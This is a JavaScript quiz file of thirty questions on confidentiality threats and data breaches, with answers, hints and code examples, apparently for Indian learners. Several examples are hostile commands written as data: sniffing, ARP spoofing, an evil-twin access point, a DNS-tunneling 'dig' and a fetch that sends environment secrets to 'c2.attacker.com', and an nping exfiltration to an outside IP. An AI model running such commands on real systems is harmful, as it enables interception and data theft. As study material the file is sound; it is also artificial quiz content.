// topic2_questions.js
// 30 Moderate to Expert Questions on Threats to Confidentiality and Data Breaches

const questions = [
  {
    question: "What constitutes a Data Breach in the context of confidentiality threats?",
    shortAnswer: "A confirmed security incident where sensitive, protected, or confidential data is copied, transmitted, viewed, stolen, or exfiltrated by an unauthorized individual or external entity.",
    explanation: "A data breach violates the confidentiality pillar and triggers statutory compliance reporting under data protection laws.",
    hint: "Unauthorized viewing, copying, or theft of sensitive corporate or customer records.",
    level: "basic",
    codeExample: "DataBreach = (UnauthorizedAccess && DataExfiltrated) -> MandatoryBreachNotification();"
  },
  {
    question: "What is Eavesdropping (Packet Sniffing) and how does it compromise confidentiality?",
    shortAnswer: "The passive interception of network packets traversing an unencrypted or compromised communications channel using network analyzers in promiscuous mode (such as Wireshark or tcpdump).",
    explanation: "Allows attackers on the same Wi-Fi or LAN to capture cleartext credentials, session cookies, and API payloads.",
    hint: "Passively capturing unencrypted network packets over shared Wi-Fi or LAN.",
    level: "basic",
    codeExample: "tcpdump -i eth0 -s 0 -w /tmp/sniffed_passwords.pcap 'port 80 or port 21'"
  },
  {
    question: "How does ARP Cache Poisoning enable Man-in-the-Middle (MitM) confidentiality attacks?",
    shortAnswer: "The attacker broadcasts forged ARP reply messages across the local Ethernet segment, mapping the default gateway's IP address to the attacker's MAC address, intercepting all outbound subnet traffic.",
    explanation: "Victims forward packets to the attacker believing they are transmitting to the legitimate gateway router.",
    hint: "Forging ARP replies so computers send all outbound internet traffic to the attacker.",
    level: "moderate",
    codeExample: "arpspoof -i eth0 -t 192.168.1.50(Victim) 192.168.1.1(Gateway)"
  },
  {
    question: "What is SSL/TLS Stripping (e.g. sslstrip) and how does it bypass HTTPS confidentiality?",
    shortAnswer: "An active MitM attack where the attacker transparently intercepts an unencrypted HTTP redirection request and prevents the client from upgrading to HTTPS, communicating with the victim over plaintext HTTP.",
    explanation: "Mitigated by HTTP Strict Transport Security (HSTS) with preloaded browser domain lists.",
    hint: "Downgrades secure HTTPS connections back to cleartext HTTP during redirection.",
    level: "expert",
    codeExample: "// Mitigated via HSTS Header:\nStrict-Transport-Security: max-age=63072000; includeSubDomains; preload"
  },
  {
    question: "What is the mandatory CERT-In reporting timeline for cyber incidents and data breaches in India?",
    shortAnswer: "Under Indian CERT-In cybersecurity directives, all organizations, intermediaries, and service providers must report covered cyber incidents and data breaches within 6 hours of noticing them.",
    explanation: "Failure to report within 6 hours can result in penal actions under Section 70B of the Indian IT Act 2000.",
    hint: "Mandatory incident reporting to CERT-In within 6 hours.",
    level: "moderate",
    codeExample: "CERT_In_Reporting_Window = 'Strict 6 Hours from initial incident detection';"
  },
  {
    question: "What are the maximum statutory penalties for failing to prevent a major personal data breach under the Digital Personal Data Protection (DPDP) Act 2023 in India?",
    shortAnswer: "Up to ₹250 Crore (₹2,50,00,00,000) per significant failure to implement reasonable security safeguards to prevent personal data breaches.",
    explanation: "The Data Protection Board of India adjudicates penalties based on severity, duration, and volume of affected data principals.",
    hint: "Up to ₹250 Crore in Indian Rupees under the DPDP Act 2023.",
    level: "expert",
    codeExample: "MaxDPDPPenalty = ₹250_00_00_000; // ₹250 Crore per significant breach"
  },
  {
    question: "How does DNS Tunneling facilitate covert data exfiltration to bypass firewalls?",
    shortAnswer: "By encoding stolen confidential data (e.g. base64) into subdomains of recursive DNS queries (e.g. 'cGF5cm9sbGRhdGE.attacker.com'); internal DNS servers forward the query to the attacker's authoritative nameserver.",
    explanation: "Firewalls typically permit outbound UDP port 53 traffic, making DNS a prime channel for stealthy exfiltration.",
    hint: "Hiding stolen data inside standard DNS lookup subdomain requests.",
    level: "expert",
    codeExample: "dig @internalDNS $(echo 'ConfidentialRecord' | base64).c2.attacker.com"
  },
  {
    question: "What is an Insider Threat and what are its two primary classifications?",
    shortAnswer: "A security risk originating from within the organization (employees, contractors, partners); categorized into 1) Malicious Insiders (deliberate espionage, theft for financial gain) and 2) Negligent/Accidental Insiders (clicking phishing links, misconfiguring cloud storage).",
    explanation: "Insiders already possess legitimate credentials and network access, making them difficult to detect via perimeter firewalls.",
    hint: "Threats from trusted employees: either malicious or negligent.",
    level: "basic",
    codeExample: "InsiderThreat = { Malicious: 'Intentional Exfiltration', Negligent: 'Accidental Misconfiguration' };"
  },
  {
    question: "What is a Memory Dump Extraction attack (e.g. using Mimikatz) and how does it compromise credentials?",
    shortAnswer: "An attacker with local administrative privileges dumps the memory space of the Local Security Authority Subsystem Service (LSASS.exe), extracting plaintext passwords, Kerberos tickets, and NTLM hashes stored in RAM.",
    explanation: "Mitigated by enabling Windows Defender Credential Guard (LSA virtualization) and RunAsPPL.",
    hint: "Extracting plaintext credentials and Kerberos hashes directly from LSASS memory.",
    level: "expert",
    codeExample: "// LSA Protection Audit Example:\nGet-Process lsass | Select-Object Name, Id, PriorityClass"
  },
  {
    question: "How do Misconfigured Public Cloud Storage Buckets (e.g. AWS S3 / Azure Blobs) lead to massive data breaches?",
    shortAnswer: "Cloud storage containers set with 'Public Read' permissions or misconfigured IAM bucket policies allow anyone on the internet to list and download sensitive database dumps, customer KYC files, and logs without authentication.",
    explanation: "One of the most prevalent causes of enterprise data breaches worldwide.",
    hint: "Leaving cloud storage buckets set to public access without authentication.",
    level: "basic",
    codeExample: "aws s3 sync s3://company-confidential-backups/ ./stolen_data/ --no-sign-request"
  },
  {
    question: "What is Credential Stuffing and how does it cause unauthorized account takeovers?",
    shortAnswer: "An automated cyberattack where bots test millions of previously breached username/password combinations across unrelated websites, exploiting user password reuse across services.",
    explanation: "Mitigated by multi-factor authentication (MFA), CAPTCHA challenges, and IP velocity rate-limiting.",
    hint: "Using leaked passwords from one site to break into accounts on other sites.",
    level: "moderate",
    codeExample: "for (credential of breachedDatabase) {\n    attemptLogin('https://target-portal.com/login', credential.user, credential.pass);\n}"
  },
  {
    question: "What is ICMP Tunneling and how is it used to exfiltrate confidential files?",
    shortAnswer: "An attacker injects arbitrary binary payload data into the data field of standard ICMP Echo Request (ping) packets, stealthily transmitting data out of networks that fail to inspect ping packet contents.",
    explanation: "Mitigated by blocking outbound ICMP at perimeter firewalls or restricting ICMP payload size to 0 bytes.",
    hint: "Embedding stolen data into ping packet payloads.",
    level: "moderate",
    codeExample: "nping --icmp -c 1 --data-string 'STOLEN_PATIENT_RECORDS' 203.0.113.50"
  },
  {
    question: "How does a Supply Chain Attack compromise enterprise confidentiality?",
    shortAnswer: "Attackers compromise a trusted third-party vendor, software library (e.g. npm package or SolarWinds update), or managed service provider (MSP), using the vendor's trusted access to bypass perimeter defenses and exfiltrate client data.",
    explanation: "Even if an organization has ₹50,00,000 in security defenses, a vulnerable third-party vendor compromises the network.",
    hint: "Infiltrating a company through a compromised third-party software vendor or library.",
    level: "moderate",
    codeExample: "// Compromised upstream package dependency exfiltrating environment secrets\nfetch('https://c2.attacker.com/leak', { method: 'POST', body: JSON.stringify(process.env) });"
  },
  {
    question: "What is Shoulder Surfing and Screen Scraping in physical confidentiality threats?",
    shortAnswer: "Shoulder surfing is directly observing screens or keypads in physical spaces; Screen Scraping is malware capturing periodic background desktop screenshots to extract sensitive records displayed to authorized users.",
    explanation: "Privacy screen filters mitigate physical viewing; EDR software mitigates background screen scraping malware.",
    hint: "Directly watching a screen or malware silently taking screenshots of sensitive files.",
    level: "basic",
    codeExample: "takeScreenshot().then(img => uploadToExfiltrationServer(img));"
  },
  {
    question: "What is Cold Boot Attack against RAM and how does it break Full Disk Encryption (FDE)?",
    shortAnswer: "An attacker with physical access super-cools the computer's RAM chips (e.g. with liquid nitrogen spray), physically resets the system, and boots into a lightweight OS to read residual data in RAM, capturing encryption master keys.",
    explanation: "DRAM cells retain charge for minutes at sub-zero temperatures even after power is disconnected.",
    hint: "Freezing RAM chips to recover residual encryption keys after a reboot.",
    level: "expert",
    codeExample: "MemoryRetentionTime = (Temperature < -50°C) ? 'Tens of Minutes' : 'Few Milliseconds';"
  },
  {
    question: "What is Side-Channel Attack (e.g. Spectre and Meltdown) on modern CPU architectures?",
    shortAnswer: "Hardware-level architectural vulnerabilities where speculative execution and cache timing analysis allow unprivileged processes to infer and read memory contents belonging to other processes or the kernel.",
    explanation: "Breaks hardware isolation between virtual machines in shared multi-tenant cloud servers.",
    hint: "Exploiting CPU speculative execution and cache timings to read unauthorized memory.",
    level: "expert",
    codeExample: "// Speculative execution probe leaking kernel memory via cache hits\nclflush(&probe_array[index]);\nspeculative_read(kernel_address);"
  },
  {
    question: "What is Spear Phishing and why is it the #1 initial vector for high-value data breaches?",
    shortAnswer: "A highly tailored, deceptive email attack targeting specific individuals (e.g. CFO or system admins) using gathered reconnaissance, tricking them into revealing master credentials or executing info-stealing malware.",
    explanation: "Attackers mimic trusted local entities (like West Bengal tax authorities or internal IT departments).",
    hint: "Personalized phishing emails targeting specific high-clearance employees.",
    level: "basic",
    codeExample: "EmailSubject = 'Urgent: Immediate Review Required for WB Commercial Tax Audit';"
  },
  {
    question: "What is Steganographic Exfiltration and how do threat actors use it?",
    shortAnswer: "Hiding encrypted confidential files inside seemingly harmless image (JPEG/PNG) or audio files by altering least significant bits (LSB), allowing files to pass undetected through standard DLP gateways.",
    explanation: "DLP engines with deep image analysis and steganalysis tools are required to detect abnormal entropy.",
    hint: "Hiding stolen data inside ordinary images to sneak past DLP filters.",
    level: "moderate",
    codeExample: "stegExfiltrate(secretSpreadsheetBytes, innocentCompanyLogoJpg);"
  },
  {
    question: "What is Data Spill (Spillage) in classified environments?",
    shortAnswer: "An accidental transfer of classified, confidential, or sensitive information onto an unclassified or unauthorized information system, network, or storage medium not cleared for that sensitivity level.",
    explanation: "Requires immediate forensic containment, physical drive quarantine, and degaussing.",
    hint: "Accidentally saving Top Secret files on an unclassified public network drive.",
    level: "moderate",
    codeExample: "IncidentType = 'CONFIDENTIAL_DATA_SPILL_TO_PUBLIC_SERVER';"
  },
  {
    question: "What is Session Hijacking (Cookie Theft) and how does it bypass MFA?",
    shortAnswer: "Malware (e.g. RedLine Stealer) extracts authenticated session tokens and cookies from browser storage; the attacker imports these cookies into their own browser to impersonate the victim without triggering MFA prompts.",
    explanation: "Mitigated by binding session tokens to device certificates, client IP ranges, and short token lifespans.",
    hint: "Stealing active session cookies to access accounts without needing password or MFA.",
    level: "moderate",
    codeExample: "document.cookie.split(';').forEach(c => exfiltrateCookie(c));"
  },
  {
    question: "What is an Optical Tap Attack on fiber optic cables?",
    shortAnswer: "A physical eavesdropping attack where an adversary bends a fiber optic glass strand to induce macro-bending, causing photons to leak through the cladding into an optical photodetector that captures unencrypted light signals.",
    explanation: "Completely passive: does not sever the connection or cause measurable light loss if calibrated properly.",
    hint: "Physically bending fiber optic cables to snoop on leaking light pulses.",
    level: "expert",
    codeExample: "MacroBendingLeakage = PhotonsRefractedThroughCladding -> CapturedByPhotoSensor;"
  },
  {
    question: "How does Evil Twin Wi-Fi attack capture confidential enterprise credentials?",
    shortAnswer: "An attacker sets up a rogue Wi-Fi access point broadcasting the exact SSID of a legitimate office network in Kolkata; when employees connect, a captive portal captures their WPA2-Enterprise or domain logins.",
    explanation: "Mitigated by 802.1X certificate-based EAP-TLS authentication where clients verify the RADIUS server certificate.",
    hint: "Setting up a fake Wi-Fi hotspot with the exact same name as the company Wi-Fi.",
    level: "basic",
    codeExample: "airbase-ng -e 'KOLKATA_CORP_WIFI' -c 6 wlan0mon"
  },
  {
    question: "What is Print Spooler Exfiltration and why is it an overlooked confidentiality threat?",
    shortAnswer: "Employees printing confidential salary or hospital patient charts leave cleartext EMF/SPL spooler temporary files on print servers, or leave physical printed documents unattended on office printer trays.",
    explanation: "Physical security policies, secure badge release printing, and spooler encryption mitigate this threat.",
    hint: "Leaving printed confidential papers in trays or unencrypted spooler files on servers.",
    level: "basic",
    codeExample: "PrintSecurity = 'Secure Badge Release (Follow-Me-Print) Required at Printer';"
  },
  {
    question: "What is Double Extortion in modern Ransomware campaigns targeting confidentiality?",
    shortAnswer: "Attackers first exfiltrate confidential customer records, financial statements, and intellectual property before encrypting systems; they threaten to publicly publish the stolen data if the ransom is not paid.",
    explanation: "Renders offline backups useless against confidentiality destruction and public regulatory humiliation.",
    hint: "Stealing data before encrypting it, then threatening to leak it online if not paid.",
    level: "moderate",
    codeExample: "RansomwareTactics = ['System_Encryption', 'Public_Data_Leak_Blackmail'];"
  },
  {
    question: "What is the role of Digital Forensics and Incident Response (DFIR) following a confirmed Data Breach?",
    shortAnswer: "DFIR teams isolate compromised systems, perform volatile memory and disk forensic imaging, analyze firewall and SIEM logs, establish the breach timeline (patient zero to exfiltration), and determine exact data exposed for regulatory disclosure.",
    explanation: "Ensures evidence maintains strict Chain of Custody for criminal prosecution under IT Act 2000.",
    hint: "Forensically investigating how the breach occurred, what data leaked, and preserving evidence.",
    level: "moderate",
    codeExample: "dfir.acquireMemoryImage('/dev/mem', 'evidence_case_2026_01.raw');"
  },
  {
    question: "How does Clipboard Hijacking threaten data confidentiality?",
    shortAnswer: "Background spyware monitors the operating system clipboard API; when users copy cryptocurrency addresses, passwords, or Aadhaar numbers, the malware either exfiltrates the clipboard text or alters recipient addresses.",
    explanation: "Modern mobile and desktop OSs now display alerts when background apps read clipboard contents.",
    hint: "Malware snooping on whatever you copy to your clipboard.",
    level: "basic",
    codeExample: "navigator.clipboard.readText().then(clipData => sendToC2(clipData));"
  },
  {
    question: "What is a Keylogger and what are its two primary implementation forms?",
    shortAnswer: "Software or hardware surveillance mechanisms that log every keystroke typed by a user; 1) Software Keyloggers (hooking OS APIs like SetWindowsHookEx) and 2) Hardware Keyloggers (physical inline USB dongles between keyboard and PC).",
    explanation: "Hardware keyloggers bypass all endpoint antivirus software since they operate independently of the OS.",
    hint: "Software or physical USB devices that record every letter typed on a keyboard.",
    level: "basic",
    codeExample: "LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { logKeystroke(wParam); }"
  },
  {
    question: "What is the typical commercial cost in Indian Rupees (₹) for a full Enterprise Post-Breach DFIR and Forensic Audit in Kolkata?",
    shortAnswer: "Approximately ₹12,00,000 to ₹35,00,000 depending on the number of compromised endpoints, forensic log reconstruction volume, legal reporting compliance, and external auditor certifications.",
    explanation: "DFIR retainers help large enterprises in Salt Lake and New Town respond rapidly to live exfiltrations.",
    hint: "Enterprise post-breach DFIR and forensic audit costs ₹12,00,000 – ₹35,00,000 in Indian Rupees.",
    level: "moderate",
    codeExample: "DFIR_Retainer_Cost = ₹18,00,000; // Comprehensive Forensic Audit in Kolkata"
  },
  {
    question: "What is Threat Intelligence and how does Dark Web Monitoring detect early confidentiality breaches?",
    shortAnswer: "Security analysts crawl underground hacker forums, Telegram leak channels, and dark web marketplaces for compromised company credentials, database dumps, and employee corporate emails offered for sale.",
    explanation: "Enables organizations to force-reset compromised credentials before attackers use them for lateral movement.",
    hint: "Monitoring underground hacker channels to spot leaked company passwords and database dumps.",
    level: "moderate",
    codeExample: "darkWebCrawler.searchForKeywords(['@kolkata-fintech.com', 'Aadhaar_DB_Dump_2026']);"
  },
  {
    question: "What is the ultimate golden rule for defending against Confidentiality Threats and Data Breaches?",
    shortAnswer: "'Assume Breach: enforce end-to-end encryption with zero exceptions, monitor egress traffic with OCR-powered DLP, eradicate unauthenticated public cloud buckets, mandate multi-factor authentication everywhere, report breaches to CERT-In within 6 hours, and budget enterprise DFIR and forensics infrastructure in Indian Rupees (₹)!'",
    explanation: "This complete rule captures defense-in-depth, continuous monitoring, statutory compliance, and enterprise budgeting.",
    hint: "Assume breach, encrypt everywhere, inspect egress DLP, report within 6 hours, and budget in ₹.",
    level: "moderate",
    codeExample: "GoldenRule: AssumeBreach() -> EncryptAll() -> MonitorEgress() -> ReportWithin6Hours() -> BudgetInRupees(₹);"
  }
];

export default questions;
